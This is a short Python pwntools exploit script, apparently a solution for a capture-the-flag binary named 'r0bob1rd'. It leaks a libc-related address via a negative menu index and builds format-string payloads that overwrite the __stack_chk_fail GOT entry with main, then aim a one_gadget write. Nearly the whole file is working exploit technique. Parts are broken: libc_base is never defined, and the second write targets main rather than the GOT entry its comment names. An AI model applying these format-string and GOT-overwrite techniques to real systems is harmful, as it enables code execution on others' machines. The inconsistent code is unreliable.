#!/usr/bin/python3
from pwn import *

elf = ELF('./r0bob1rd', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)
context.binary = elf
context.terminal = ['tmux', 'splitw', '-h']
p = process(['./r0bob1rd', '0'])
# gdb.attach(p, '''b *0x400b54''')

# Leaks libc base
p.recvuntil(b' > ')
p.sendline(b'-6')
p.recvuntil(b'chosen: ')

usleep_plt = int.from_bytes(p.recvuntil(b'\n').strip(), 'little') - 6
log.info(f'usleep@plt: {hex(usleep_plt)}')

# Payload
# Overwrite __stack_chk_fail with main
p.recvuntil(b'> ')
payload = fmtstr_payload(8, {elf.got.__stack_chk_fail: elf.sym.main }, write_size='short')
p.sendline(p64(usleep_plt) + b'%s')
p.recvuntil(b'[Description]\n')
res = p.recvline().strip()
log.info(f'Leaked libc address: {hex(int.from_bytes(res, "little"))}')
# p.sendline(payload + b'A' * (104 - len(payload)))
p.interactive()

# Overwrite __stack_chk_fail with one_gadget
p.recvuntil(b' > ')
p.sendline(b'0')
p.recvuntil(b'> ')
payload = fmtstr_payload(8, {elf.sym.main: libc_base + 0xe3b04}, write_size='short')
p.sendline(payload + b'A' * (104 - len(payload)))

p.interactive()
